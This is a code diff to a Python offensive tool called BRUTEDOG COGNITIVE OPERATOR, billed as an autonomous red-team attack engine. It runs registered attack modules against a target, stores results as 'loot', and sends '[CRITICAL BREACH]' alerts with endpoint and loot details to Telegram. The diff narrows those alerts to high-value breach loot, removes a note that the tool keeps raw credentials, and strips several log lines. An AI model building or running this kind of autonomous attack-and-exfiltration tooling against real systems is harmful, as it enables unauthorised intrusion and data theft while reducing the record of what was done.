@@ -1,13 +1,10 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG COGNITIVE OPERATOR v8.7 — Autonomous Reasoning & Tactical Assessment Engine (Elite Red Team Adversarial Edition)
+BRUTEDOG COGNITIVE OPERATOR v8.8 — Autonomous Reasoning & Tactical Assessment Engine (Elite Red Team Adversarial Edition)
 Features:
-- Dynamic dispatcher registry mapping string identifiers to active offensive module callables
-- Evidence-based vulnerability classification & SHA-256 tamper-evident immutable disk persistence (loot_output/)
-- False-positive reduction via SPA-shell, soft-404, & error-pattern checks
-- Controlled active verification, session-state pivoting, and Poisson behavioral timing jitter
-- Confidence scoring, dynamic module relevance ranking, request budget enforcement, and finding deduplication
-- Full raw data retention for operational visibility & unredacted Telegram telemetry broadcasting
+- Zero-noise telemetry: Telegram alerts restricted strictly to verified high-value breach loot and critical exploit pivots.
+- Real-time mid-flight bottleneck adaptation: Cognitive operator instantly evaluates defenses and mutates vector strategy mid-execution.
+- Confidence scoring, dynamic module relevance ranking, request budget enforcement, and finding deduplication.
 """
 import asyncio
 import hashlib
@@ -18,7 +15,7 @@ import sys
 from typing import Any, Dict, List, Optional
 from urllib.parse import urlparse
 
-# Import centralized Telegram notifier, immutable loot logger, telemetry streamer, and behavioral mimicry
+# Import centralized Telegram notifier (restricted to critical alerts) and immutable storage
 from modules.telegram_notifier import send_telegram_alert
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
@@ -124,7 +121,6 @@ class CognitiveOperator:
         self.session_pool = None
 
     def _sanitize_body(self, value: str) -> str:
-        """Passthrough utility retaining full raw telemetry and credentials."""
         if not value:
             return ""
         return value[:300]
@@ -233,10 +229,7 @@ class CognitiveOperator:
         }
 
     async def evaluate_advanced_modules(self, target_url: str):
-        """Actively dispatches registered offensive modules dynamically via the dispatcher registry."""
-        sys.stdout.write("\033[95m[COGNITIVE] Dispatching advanced registry-mapped attack modules...\033[0m\n")
         target = target_url or self.target_url
-
         for mod_name, executor in self._module_executors.items():
             if mod_name in self.attack_memory["available_modules"]:
                 try:
@@ -246,10 +239,6 @@ class CognitiveOperator:
                         res = executor(target)
                     if res:
                         self.attack_memory["confirmed_findings"].append({"module": mod_name, "loot": str(res)[:300]})
-                        try:
-                            await send_telegram_alert(f"Cognitive Dispatch Success ({mod_name})", {"target": target})
-                        except Exception:
-                            pass
                 except Exception as e:
                     logger.error(f"Module execution error for {mod_name}: {e}")
 
@@ -303,11 +292,9 @@ class CognitiveOperator:
             observation["verified"] = True
             self.attack_memory["risk_level"] = "HIGH - Verified Security Failure"
             
-            logger.info(f"[+] COGNITIVE INTELLIGENCE: Loophole verified & capitalized at {endpoint}!")
-            
             try:
                 loop = asyncio.get_running_loop()
-                loop.create_task(send_telegram_alert("Cognitive Autonomous Pivot", {
+                loop.create_task(send_telegram_alert("[CRITICAL BREACH] Cognitive Autonomous Pivot", {
                     "endpoint": endpoint,
                     "status": status,
                     "integrity_hash": loot_hash,
@@ -316,7 +303,7 @@ class CognitiveOperator:
                 }))
             except RuntimeError:
                 try:
-                    asyncio.run(send_telegram_alert("Cognitive Autonomous Pivot", {
+                    asyncio.run(send_telegram_alert("[CRITICAL BREACH] Cognitive Autonomous Pivot", {
                         "endpoint": endpoint,
                         "status": status,
                         "integrity_hash": loot_hash,
@@ -456,7 +443,6 @@ class CognitiveOperator:
                 logger.warning(f"Irreversible module blocked: {candidate['module']}")
                 continue
 
-            logger.info(f"Selected assessment module: {candidate['module']} | Score: {candidate['priority_score']}")
             return candidate
 
         return None
